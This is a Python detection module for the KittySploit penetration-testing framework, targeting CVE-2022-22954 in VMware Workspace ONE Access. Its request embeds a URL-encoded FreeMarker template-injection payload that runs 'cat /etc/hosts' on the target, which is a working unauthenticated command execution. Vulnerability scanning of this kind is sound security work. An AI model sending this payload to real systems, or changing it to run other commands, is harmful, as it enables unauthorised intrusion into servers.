#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""VMware Workspace ONE Access is susceptible to a remote code execution vulnerability due to a server-side templ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'VMware Workspace ONE Access - Server-Side Template Injection Detection',
        'description': 'VMware Workspace ONE Access is susceptible to a remote code execution vulnerability due to a server-side template injection flaw. An unauthenticated attacker with network access could exploit this vulnerability by sending a specially crafted request to a vulnerable VMware Workspace ONE or Identity Manager.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'workspaceone', 'kev', 'tenable', 'packetstorm', 'vmware', 'ssti', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.tenable.com/blog/vmware-patches-multiple-vulnerabilities-in-workspace-one-vmsa-2022-0011',
            'https://www.vmware.com/security/advisories/VMSA-2022-0011.html',
            'http://packetstormsecurity.com/files/166935/VMware-Workspace-ONE-Access-Template-Injection-Command-Execution.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-22954',
        ],
        'cve': 'CVE-2022-22954',
    }

    def run(self):
        r = self.http_request(method="GET", path='/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%68%6f%73%74%73%22%29%7d', allow_redirects=False)
        if not r or r.status_code != 400:
            return False
        body = r.text or ""
        body_any = ('Authorization context is not valid',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='critical',
                reason="VMware Workspace ONE Access - Server-Side Template Injection detected",
                path='/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%68%6f%73%74%73%22%29%7d',
            )
            return True
        return False

